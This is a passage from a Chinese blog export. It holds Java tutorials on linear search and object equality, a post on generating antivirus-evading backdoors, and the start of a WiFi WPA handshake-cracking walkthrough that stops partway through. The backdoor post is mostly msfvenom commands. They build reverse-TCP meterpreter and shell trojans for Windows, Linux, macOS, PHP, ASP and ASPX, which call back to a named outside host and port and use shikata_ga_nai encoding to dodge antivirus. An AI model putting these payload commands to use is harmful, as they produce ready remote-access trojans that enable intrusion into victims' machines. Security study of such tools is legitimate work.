class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Student another)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        if(this.score &lt; another.score)</span></span><br><span class="line"><span class="comment">//            return -1;</span></span><br><span class="line"><span class="comment">//        else if(this.score == another.score)</span></span><br><span class="line"><span class="comment">//            return 0;</span></span><br><span class="line"><span class="comment">//          return 1;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.score - another.score; <span class="comment">//优雅写法 从小到大按分数排序</span></span><br><span class="line"><span class="comment">//          return another.score - this.score;  //从大到小按分数进行排序</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object student)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span> == student)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(student == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.getClass() != student.getClass())</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        Student another = (Student)student;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name.equals(another.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Student(name: %s, score: %d)"</span>, name, score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>选择排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-线性查找法</title>
    <url>/2021/06/24/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E7%BA%BF%E6%80%A7%E6%9F%A5%E6%89%BE%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="什么是算法"><a href="#什么是算法" class="headerlink" title="什么是算法"></a>什么是算法</h1><blockquote>
<ul>
<li><h2 id="一、有限性"><a href="#一、有限性" class="headerlink" title="一、有限性"></a>一、有限性</h2></li>
<li><h2 id="二、确定性：不会产生二义性"><a href="#二、确定性：不会产生二义性" class="headerlink" title="二、确定性：不会产生二义性"></a>二、确定性：不会产生二义性</h2></li>
<li><h2 id="三、可行性"><a href="#三、可行性" class="headerlink" title="三、可行性"></a>三、可行性</h2></li>
<li><h2 id="四、输入"><a href="#四、输入" class="headerlink" title="四、输入"></a>四、输入</h2></li>
<li><h2 id="五、输出"><a href="#五、输出" class="headerlink" title="五、输出"></a>五、输出</h2></li>
</ul>
</blockquote>
<h1 id="线性查找法"><a href="#线性查找法" class="headerlink" title="线性查找法"></a>线性查找法</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210624033722887.png" alt="image-20210624033722887"></p>
<h1 id="使用泛型"><a href="#使用泛型" class="headerlink" title="使用泛型"></a>使用泛型</h1><blockquote>
<ul>
<li><h2 id="不可以是基本数据类型，只能是类对象"><a href="#不可以是基本数据类型，只能是类对象" class="headerlink" title="不可以是基本数据类型，只能是类对象"></a>不可以是基本数据类型，只能是类对象</h2><ul>
<li><h3 id="基本数据类型：boolean-byte-char-short-int-long-float-double"><a href="#基本数据类型：boolean-byte-char-short-int-long-float-double" class="headerlink" title="基本数据类型：boolean,byte,char,short,int,long,float,double"></a>基本数据类型：boolean,byte,char,short,int,long,float,double</h3></li>
</ul>
</li>
<li><h2 id="每个基本数据类型都有对应的包装类"><a href="#每个基本数据类型都有对应的包装类" class="headerlink" title="每个基本数据类型都有对应的包装类"></a>每个基本数据类型都有对应的包装类</h2><ul>
<li><h3 id="Boolean-Byte-Character-Short-Integer-Long-Float-Double"><a href="#Boolean-Byte-Character-Short-Integer-Long-Float-Double" class="headerlink" title="Boolean, Byte, Character, Short, Integer, Long, Float, Double"></a>Boolean, Byte, Character, Short, Integer, Long, Float, Double</h3></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="线性查找法Java执行结果截图"><a href="#线性查找法Java执行结果截图" class="headerlink" title="线性查找法Java执行结果截图"></a>线性查找法Java执行结果截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210624111228181.png" alt="image-20210624111228181"></p>
<h1 id="线性查找法Java代码"><a href="#线性查找法Java代码" class="headerlink" title="线性查找法Java代码"></a>线性查找法Java代码</h1><h2 id="LinearSearch-java"><a href="#LinearSearch-java" class="headerlink" title="LinearSearch.java"></a>LinearSearch.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinearSearch</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LinearSearch</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(E[] data, E target)</span></span>&#123; <span class="comment">//泛型方法</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data.length; i++)</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(target)) <span class="comment">//equals用于值相等，尽量不写==</span></span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] data = &#123;<span class="number">24</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">66</span>, <span class="number">32</span>, <span class="number">4</span>&#125;; <span class="comment">//手动修改数组类型</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> res1 = LinearSearch.search(data, <span class="number">16</span>);  <span class="comment">//自动转换泛型类，数组型不能</span></span><br><span class="line">        System.out.println(res1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> res2 = LinearSearch.search(data, <span class="number">666</span>);</span><br><span class="line">        System.out.println(res2);</span><br><span class="line"><span class="comment">//以下代码可不需要-----------------------------</span></span><br><span class="line">        Student[] students = &#123;<span class="keyword">new</span> Student(<span class="string">"Alice"</span>),</span><br><span class="line">                              <span class="keyword">new</span> Student(<span class="string">"Bob"</span>),</span><br><span class="line">                              <span class="keyword">new</span> Student(<span class="string">"Charles"</span>)&#125;;</span><br><span class="line">        Student bob = <span class="keyword">new</span> Student(<span class="string">"bOb"</span>); <span class="comment">//不区分大小写</span></span><br><span class="line">        <span class="keyword">int</span> res3 = LinearSearch.search(students, bob);</span><br><span class="line">        System.out.println(res3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Student-java"><a href="#Student-java" class="headerlink" title="Student.java"></a>Student.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="comment">//以下代码可不需要-----------------------------</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object student)</span></span>&#123; <span class="comment">//student是Object的对象</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span> == student) <span class="comment">//判断对象是否等于student</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(student == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.getClass() != student.getClass()) <span class="comment">//当前的类对象是否等于object这个student类对象</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        Student another = (Student)student; <span class="comment">//将student转换为Student 进行覆盖</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name.toLowerCase().equals(another.name.toLowerCase()); <span class="comment">//toLowerCase转小写，进行不区分大小写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210624052355565.png" alt="image-20210624052355565"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210624111001209.png" alt="image-20210624111001209"></p>
<h1 id="线性查找算法运行结果截图"><a href="#线性查找算法运行结果截图" class="headerlink" title="线性查找算法运行结果截图"></a>线性查找算法运行结果截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210624133647027.png" alt="image-20210624133647027"></p>
<h1 id="线性查找法算法时间测试"><a href="#线性查找法算法时间测试" class="headerlink" title="线性查找法算法时间测试"></a>线性查找法算法时间测试</h1><h2 id="LinearSearch-java-1"><a href="#LinearSearch-java-1" class="headerlink" title="LinearSearch.java"></a>LinearSearch.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinearSearch</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LinearSearch</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(E[] data, E target)</span></span>&#123; <span class="comment">//泛型方法</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data.length; i++)</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(target)) <span class="comment">//equals用于值相等，尽量不写==</span></span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] dataSize = &#123;<span class="number">10000000</span>,<span class="number">100000000</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> n: dataSize) &#123;</span><br><span class="line">            Integer[] data = ArrayGenerator.generateOrderedArray(n); <span class="comment">//手动修改数组类型</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">100</span>; k++)</span><br><span class="line">                LinearSearch.search(data, n);  <span class="comment">//自动转换泛型类，数组型不能</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line">            <span class="keyword">double</span> time = (endTime - startTime) / <span class="number">1000000000.0</span>; <span class="comment">//单位是纳秒 浮点数加零 计算时间复杂 可以判断算法性能</span></span><br><span class="line">            System.out.println(<span class="string">"n ="</span> + n + <span class="string">", 1000 runs :"</span> + time + <span class="string">" s"</span>); <span class="comment">//打印出花费时间</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        int res2 = LinearSearch.search(data, 666);</span></span><br><span class="line"><span class="comment">//        System.out.println(res2);</span></span><br><span class="line"></span><br><span class="line">        Student[] students = &#123;<span class="keyword">new</span> Student(<span class="string">"Alice"</span>),</span><br><span class="line">                              <span class="keyword">new</span> Student(<span class="string">"Bob"</span>),</span><br><span class="line">                              <span class="keyword">new</span> Student(<span class="string">"Charles"</span>)&#125;;</span><br><span class="line">        Student bob = <span class="keyword">new</span> Student(<span class="string">"bOb"</span>); <span class="comment">//不区分大小写</span></span><br><span class="line">        <span class="keyword">int</span> res3 = LinearSearch.search(students, bob);</span><br><span class="line">        System.out.println(res3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【后门攻击】后门生成模块免杀</title>
    <url>/2021/06/23/%E3%80%90%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB%E3%80%91%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E6%A8%A1%E5%9D%97%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="从后面生成模块到权限维持基本命令"><a href="#从后面生成模块到权限维持基本命令" class="headerlink" title="从后面生成模块到权限维持基本命令"></a>从后面生成模块到权限维持基本命令</h1><blockquote>
<ul>
<li><h2 id="命令参数解释"><a href="#命令参数解释" class="headerlink" title="命令参数解释"></a>命令参数解释</h2><ul>
<li><h3 id="p、-payload-指定payload"><a href="#p、-payload-指定payload" class="headerlink" title="-p、-payload 指定payload"></a>-p、-payload 指定payload</h3></li>
<li><h3 id="–list-payloads-列出可以设置的payload选项"><a href="#–list-payloads-列出可以设置的payload选项" class="headerlink" title="–list payloads 列出可以设置的payload选项"></a>–list payloads 列出可以设置的payload选项</h3></li>
<li><h3 id="l、-list-列出可用项"><a href="#l、-list-列出可用项" class="headerlink" title="-l、-list 列出可用项"></a>-l、-list 列出可用项</h3></li>
<li><h3 id="n-指定nop在payload的数量"><a href="#n-指定nop在payload的数量" class="headerlink" title="-n 指定nop在payload的数量"></a>-n 指定nop在payload的数量</h3></li>
<li><h3 id="f-指定文件输出格式"><a href="#f-指定文件输出格式" class="headerlink" title="-f 指定文件输出格式"></a>-f 指定文件输出格式</h3></li>
<li><h3 id="–list-formats-列出可用输出格式"><a href="#–list-formats-列出可用输出格式" class="headerlink" title="–list formats 列出可用输出格式"></a>–list formats 列出可用输出格式</h3></li>
<li><h3 id="e、-encoder-指定使用编码器"><a href="#e、-encoder-指定使用编码器" class="headerlink" title="e、-encoder 指定使用编码器"></a>e、-encoder 指定使用编码器</h3></li>
<li><h3 id="–list-encoders-查看可用的编码器"><a href="#–list-encoders-查看可用的编码器" class="headerlink" title="–list encoders 查看可用的编码器"></a>–list encoders 查看可用的编码器</h3></li>
<li><h3 id="a，–arch-指定目标系统架构"><a href="#a，–arch-指定目标系统架构" class="headerlink" title="-a，–arch 指定目标系统架构"></a>-a，–arch 指定目标系统架构</h3></li>
<li><h3 id="–platform-指定目标系统"><a href="#–platform-指定目标系统" class="headerlink" title="–platform 指定目标系统"></a>–platform 指定目标系统</h3></li>
<li><h3 id="–list-platform-查看可用的目标系统"><a href="#–list-platform-查看可用的目标系统" class="headerlink" title="–list platform 查看可用的目标系统"></a>–list platform 查看可用的目标系统</h3></li>
<li><h3 id="s-未经编码的payload的最大长度"><a href="#s-未经编码的payload的最大长度" class="headerlink" title="-s 未经编码的payload的最大长度"></a>-s 未经编码的payload的最大长度</h3></li>
<li><h3 id="–encoder-space-编码后的payload最大长度"><a href="#–encoder-space-编码后的payload最大长度" class="headerlink" title="–encoder-space  编码后的payload最大长度"></a>–encoder-space <length> 编码后的payload最大长度</h3></li>
<li><h3 id="b-设置在paylaod中避免出现的字符"><a href="#b-设置在paylaod中避免出现的字符" class="headerlink" title="-b 设置在paylaod中避免出现的字符"></a>-b 设置在paylaod中避免出现的字符</h3></li>
<li><h3 id="i-设置payload的编码次数"><a href="#i-设置payload的编码次数" class="headerlink" title="-i 设置payload的编码次数"></a>-i 设置payload的编码次数</h3></li>
<li><h3 id="c-、–add-code-包含额外的win32-shellcode文件"><a href="#c-、–add-code-包含额外的win32-shellcode文件" class="headerlink" title="-c 、–add-code 包含额外的win32 shellcode文件"></a>-c 、–add-code 包含额外的win32 shellcode文件</h3></li>
<li><h3 id="x、–template-指定特定可执行文件作为模板"><a href="#x、–template-指定特定可执行文件作为模板" class="headerlink" title="-x、–template 指定特定可执行文件作为模板"></a>-x、–template 指定特定可执行文件作为模板</h3></li>
<li><h3 id="k、–keep-保护模板的功能、注入的payload作为-一个新的进程运行"><a href="#k、–keep-保护模板的功能、注入的payload作为-一个新的进程运行" class="headerlink" title="-k、–keep 保护模板的功能、注入的payload作为 一个新的进程运行"></a>-k、–keep 保护模板的功能、注入的payload作为 一个新的进程运行</h3></li>
<li><h3 id="o-保存paylaod到文件"><a href="#o-保存paylaod到文件" class="headerlink" title="-o 保存paylaod到文件"></a>-o 保存paylaod到文件</h3></li>
<li><h3 id="v-指定变量名"><a href="#v-指定变量名" class="headerlink" title="-v 指定变量名"></a>-v 指定变量名</h3></li>
</ul>
</li>
</ul>
</blockquote>
<p>ad39402345.wicp.vip:26240</p>
<h1 id="常见后门生成方式"><a href="#常见后门生成方式" class="headerlink" title="常见后门生成方式"></a>常见后门生成方式</h1><blockquote>
<ul>
<li><h2 id="一、windows"><a href="#一、windows" class="headerlink" title="一、windows"></a>一、windows</h2><ul>
<li><h3 id="命令：msfvenom-a-x64-–platform-Windows-p-windows-x64-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-exe-o-木马名称-exe"><a href="#命令：msfvenom-a-x64-–platform-Windows-p-windows-x64-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-exe-o-木马名称-exe" class="headerlink" title="命令：msfvenom -a x64 –platform Windows -p windows/x64/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f exe -o 木马名称.exe"></a>命令：msfvenom -a x64 –platform Windows -p windows/x64/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f exe -o 木马名称.exe</h3></li>
<li><h3 id="msfvenom-a-x64-–platform-Windows-p-windows-x64-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-e-x86-shikata-ga-nai-i-3-f-exe-o-木马名称-exe"><a href="#msfvenom-a-x64-–platform-Windows-p-windows-x64-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-e-x86-shikata-ga-nai-i-3-f-exe-o-木马名称-exe" class="headerlink" title="msfvenom -a x64 –platform Windows -p windows/x64/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -e x86/shikata_ga_nai -i 3 -f exe -o 木马名称.exe"></a>msfvenom -a x64 –platform Windows -p windows/x64/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -e x86/shikata_ga_nai -i 3 -f exe -o 木马名称.exe</h3></li>
</ul>
</li>
<li><h2 id="二、Linux"><a href="#二、Linux" class="headerlink" title="二、Linux"></a>二、Linux</h2><ul>
<li><h3 id="msfvenom-p-linux-x86-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-elf-o-木马名称-elf"><a href="#msfvenom-p-linux-x86-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-elf-o-木马名称-elf" class="headerlink" title="msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f elf -o 木马名称.elf"></a>msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f elf -o 木马名称.elf</h3></li>
</ul>
</li>
<li><h2 id="三、MAC"><a href="#三、MAC" class="headerlink" title="三、MAC"></a>三、MAC</h2><ul>
<li><h3 id="msfvenom-p-osx-x86-shell-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-macho-o-木马名称-macho"><a href="#msfvenom-p-osx-x86-shell-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-macho-o-木马名称-macho" class="headerlink" title="msfvenom -p osx/x86/shell_reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f macho -o 木马名称.macho"></a>msfvenom -p osx/x86/shell_reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f macho -o 木马名称.macho</h3></li>
</ul>
</li>
<li><h2 id="四、PHP"><a href="#四、PHP" class="headerlink" title="四、PHP"></a>四、PHP</h2><ul>
<li><h3 id="msfvenom-p-php-x86-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-raw-o-木马名称-php"><a href="#msfvenom-p-php-x86-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-raw-o-木马名称-php" class="headerlink" title="msfvenom -p php/x86/meterpreter_reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f raw -o 木马名称.php"></a>msfvenom -p php/x86/meterpreter_reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f raw -o 木马名称.php</h3></li>
</ul>
</li>
<li><h2 id="五、ASP"><a href="#五、ASP" class="headerlink" title="五、ASP"></a>五、ASP</h2><ul>
<li><h3 id="msfvenom-p-windows-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-asp-o-木马名称-asp"><a href="#msfvenom-p-windows-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-asp-o-木马名称-asp" class="headerlink" title="msfvenom -p windows/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f asp -o 木马名称.asp"></a>msfvenom -p windows/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f asp -o 木马名称.asp</h3></li>
</ul>
</li>
<li><h2 id="六、ASPX"><a href="#六、ASPX" class="headerlink" title="六、ASPX"></a>六、ASPX</h2><ul>
<li><h3 id="msfvenom-p-windows-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-aspx-o-木马名称-aspx"><a href="#msfvenom-p-windows-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-aspx-o-木马名称-aspx" class="headerlink" title="msfvenom -p windows/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f aspx -o 木马名称.aspx"></a>msfvenom -p windows/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f aspx -o 木马名称.aspx</h3></li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>漏洞工具</tag>
        <tag>免杀</tag>
        <tag>渗透测试</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>【嗅探工具】无线WIFI密码破解</title>
    <url>/2021/06/21/%E3%80%90%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7%E3%80%91%E6%97%A0%E7%BA%BFWIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>本文仅介绍通过抓取握手包的方式破解WPA/WPA2的密码，用到的工具是Kali Linux自带的airmon-ng，以及地表最强密码破解工具hashcat（可选）。</li>
</ul>
</blockquote>
<h1 id="Aircrack-ng破解wifi使用的几个套件"><a href="#Aircrack-ng破解wifi使用的几个套件" class="headerlink" title="Aircrack-ng破解wifi使用的几个套件"></a>Aircrack-ng破解wifi使用的几个套件</h1><blockquote>
<ul>
<li><h2 id="aircrack-ng-破解WEP以及WPA（字典攻击）密钥"><a href="#aircrack-ng-破解WEP以及WPA（字典攻击）密钥" class="headerlink" title="aircrack-ng 破解WEP以及WPA（字典攻击）密钥"></a>aircrack-ng 破解WEP以及WPA（字典攻击）密钥</h2></li>
<li><h2 id="airdecap-ng-通过已知密钥来解密WEP或WPA嗅探数据"><a href="#airdecap-ng-通过已知密钥来解密WEP或WPA嗅探数据" class="headerlink" title="airdecap-ng 通过已知密钥来解密WEP或WPA嗅探数据"></a>airdecap-ng 通过已知密钥来解密WEP或WPA嗅探数据</h2></li>
<li><h2 id="airmon-ng-将网卡设定为监听模式"><a href="#airmon-ng-将网卡设定为监听模式" class="headerlink" title="airmon-ng 将网卡设定为监听模式"></a>airmon-ng 将网卡设定为监听模式</h2></li>
<li><h2 id="aireplay-ng-数据包注入工具"><a href="#aireplay-ng-数据包注入工具" class="headerlink" title="aireplay-ng 数据包注入工具"></a>aireplay-ng 数据包注入工具</h2></li>
<li><h2 id="airodump-ng-数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息"><a href="#airodump-ng-数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息" class="headerlink" title="airodump-ng 数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息"></a>airodump-ng 数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息</h2></li>
</ul>
</blockquote>
<h1 id="WIFI破解配置要求"><a href="#WIFI破解配置要求" class="headerlink" title="WIFI破解配置要求"></a>WIFI破解配置要求</h1><blockquote>
<ul>
<li><h2 id="自建WIFI进行测试"><a href="#自建WIFI进行测试" class="headerlink" title="自建WIFI进行测试"></a>自建WIFI进行测试</h2></li>
<li><h2 id="外置网卡设备具备监听（RT5370）"><a href="#外置网卡设备具备监听（RT5370）" class="headerlink" title="外置网卡设备具备监听（RT5370）"></a>外置网卡设备具备监听（RT5370）</h2></li>
<li><h2 id="信号稳定"><a href="#信号稳定" class="headerlink" title="信号稳定"></a>信号稳定</h2></li>
</ul>
</blockquote>
<h1 id="WIFI破解的流程-第一种情况密码简单"><a href="#WIFI破解的流程-第一种情况密码简单" class="headerlink" title="WIFI破解的流程-第一种情况密码简单"></a>WIFI破解的流程-第一种情况密码简单</h1><blockquote>
<ul>
<li><h2 id="一、插上网卡，查看是否已接入kali虚拟机"><a href="#一、插上网卡，查看是否已接入kali虚拟机" class="headerlink" title="一、插上网卡，查看是否已接入kali虚拟机"></a>一、插上网卡，查看是否已接入kali虚拟机</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210621175921359.png" alt="image-20210621175921359"></li>
</ul>
</li>
<li><h2 id="二、使用airmon-ng套件查看网卡是否具备监听功能"><a href="#二、使用airmon-ng套件查看网卡是否具备监听功能" class="headerlink" title="二、使用airmon-ng套件查看网卡是否具备监听功能"></a>二、使用airmon-ng套件查看网卡是否具备监听功能</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210621180025457.png" alt="image-20210621180025457"></li>
</ul>
</li>
<li><h2 id="三、开启无线网卡监控模式"><a href="#三、开启无线网卡监控模式" class="headerlink" title="三、开启无线网卡监控模式"></a>三、开启无线网卡监控模式</h2><ul>
<li><h3 id="命令：airmon-ng-start-wlan0"><a href="#命令：airmon-ng-start-wlan0" class="headerlink" title="命令：airmon-ng start wlan0"></a>命令：airmon-ng start wlan0</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210621180326463.png" alt="image-20210621180326463"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210621180352819.png" alt="image-20210621180352819"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="四、查看周围WIFI网络"><a href="#四、查看周围WIFI网络" class="headerlink" title="四、查看周围WIFI网络"></a>四、查看周围WIFI网络</h2><ul>
<li><h3 id="命令：airodump-ng-wlan0mon"><a href="#命令：airodump-ng-wlan0mon" class="headerlink" title="命令：airodump-ng wlan0mon"></a>命令：airodump-ng wlan0mon</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210621181347840.png" alt="image-20210621181347840"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210621181910481.png" alt="image-20210621181910481"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="五、监听目标网络的握手包"><a href="#五、监听目标网络的握手包" class="headerlink" title="五、监听目标网络的握手包"></a>五、监听目标网络的握手包</h2><ul>
